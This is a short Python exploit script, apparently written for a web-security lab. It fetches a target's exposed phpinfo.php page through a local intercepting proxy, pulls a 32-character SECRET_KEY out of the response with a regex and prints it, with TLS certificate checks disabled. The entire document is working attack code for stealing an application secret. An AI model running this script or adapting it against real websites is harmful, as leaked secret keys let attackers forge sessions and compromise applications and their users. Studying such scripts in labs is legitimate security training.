import requests
import sys
import urllib3
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def obtain_secret_key(s, url):

    phpinfo_url = url + "/cgi-bin/phpinfo.php"
    r = s.get(phpinfo_url, verify=False, proxies=proxies)
    res = r.text
    if (r.status_code == 200):
        print("(+) Successfully exploited vulnerability!")
        secret_key = re.search('[0-9a-zA-Z]{32} ', res)
        print("(+) The following is the SECRET_KEY: " + secret_key.group(0))
    else:
        print("(-) Could not exploit vulnerability.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    obtain_secret_key(s, url)

if __name__ == "__main__":
    main()